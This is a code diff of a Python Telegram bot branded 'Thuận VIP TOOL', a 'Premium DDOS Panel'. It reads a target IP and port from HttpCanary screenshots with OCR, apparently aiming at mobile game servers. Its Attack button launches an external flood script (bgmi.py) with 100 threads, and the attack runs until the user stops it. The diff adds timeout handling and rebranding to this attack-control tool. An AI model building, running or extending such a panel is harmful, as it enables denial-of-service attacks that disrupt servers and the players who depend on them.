@@ -7,22 +7,20 @@ from io import BytesIO
 from datetime import datetime
 from PIL import Image
 import pytesseract
-from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
+from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
+from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
+from telegram.error import TimedOut
 from config import TELEGRAM_BOT_TOKEN
 
 selected_target = {}
 attack_process = None
 
-import pytesseract
-from PIL import Image
-
-# IMPORTANT: Set tesseract path
+# Set tesseract path
 pytesseract.pytesseract.tesseract_cmd = "/usr/bin/tesseract"
 
-# 💣 Fixed Info (safe inside daku.py)
+# Fixed Info
 OWNER_USERNAME = '@Thuanmodessp'
-CHANNEL_LINK = 'Zalo 0799433261'
+CHANNEL_LINK = 'Thuandepzai'
 EXPIRY_DATE = datetime(2030, 8, 2)
 
 def check_expiry():
@@ -33,7 +31,7 @@ def check_expiry():
 def welcome_banner():
     banner = f"""
 ────────────────────────────────────────
-🔥 WELCOME TO THUẬN VIP TOOL 🔥
+🔥 WELCOME TO Thuận VIP TOOL 🔥
 
 💣 Premium DDOS Panel 💣
 🔒 Secure Access Only
@@ -52,10 +50,17 @@ def extract_ip_port_from_image(image: Image.Image):
         return matches[0][0], int(matches[0][1])
     return None, None
 
+async def safe_reply(update, text, **kwargs):
+    try:
+        await update.message.reply_text(text, **kwargs)
+    except TimedOut:
+        print("⚠️ Telegram request timed out, bỏ qua tin nhắn này")
+
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "🤖 *DDoS Panel Bot by Thuận *\n\n"
-        "📸 Please send a clear App Pcapadroi đc screenshot to automatically extract the IP and Port (Port must start with `100**`).\n\n"
+    await safe_reply(
+        update,
+        "🤖 *DDoS Panel Bot by Thuận*\n\n"
+        "📸 Please send a clear HttpCanary screenshot to automatically extract the IP and Port (Port must start with `100**`).\n\n"
         "⬇️ Once target is detected, use the buttons below to *start* or *stop* the attack.\n\n"
         "_Note: Buttons will always remain visible for easy control._",
         parse_mode="Markdown"
@@ -75,13 +80,14 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
         keyboard = [[KeyboardButton("🚀 Attack"), KeyboardButton("⛔ Stop")]]
         reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
 
-        await update.message.reply_text(
+        await safe_reply(
+            update,
             f"🎯 Target Detected:\n`{ip}:{port}`\n\nChoose action:",
             parse_mode="Markdown",
             reply_markup=reply_markup
         )
     else:
-        await update.message.reply_text("❌ IP/Port not found. Send clear screenshot.")
+        await safe_reply(update, "❌ IP/Port not found. Send clear screenshot.")
 
 async def handle_action(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global attack_process
@@ -89,24 +95,25 @@ async def handle_action(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text.strip()
 
     if chat_id not in selected_target:
-        await update.message.reply_text("❌ No target selected.")
+        await safe_reply(update, "❌ No target selected.")
         return
 
     ip, port = selected_target[chat_id]
 
     if text == "🚀 Attack":
         if attack_process:
-            await update.message.reply_text("⚠️ Already running!")
+            await safe_reply(update, "⚠️ Already running!")
             return
 
-        # No duration so runs until manually stopped
+        # Cấu hình attack
         packet_size = 100
         threads = 100
         command = ["./bgmi.py", ip, str(port), "9999", str(packet_size), str(threads)]
 
         attack_process = subprocess.Popen(command)
 
-        await update.message.reply_text(
+        await safe_reply(
+            update,
             f"🔥 Attack Started!\n🎯 `{ip}:{port}`\n\n⏹️ Use Stop button to end.",
             parse_mode="Markdown"
         )
@@ -116,21 +123,24 @@ async def handle_action(update: Update, context: ContextTypes.DEFAULT_TYPE):
             os.kill(attack_process.pid, signal.SIGINT)
             attack_process.wait()
             attack_process = None
-            await update.message.reply_text("✅ Attack stopped.")
+            await safe_reply(update, "✅ Attack stopped.")
         else:
-            await update.message.reply_text("ℹ️ No running attack.")
+            await safe_reply(update, "ℹ️ No running attack.")
 
 def main():
     check_expiry()
     welcome_banner()
     
-    app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
+    # Tăng timeout để giảm lỗi TimedOut
+    app = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN)\
+        .connect_timeout(60).read_timeout(60).build()
+    
     app.add_handler(CommandHandler("start", start))
     app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_action))
+    
     print("🤖 Bot is running...")
     app.run_polling()
 
 if __name__ == "__main__":
     main()
-    
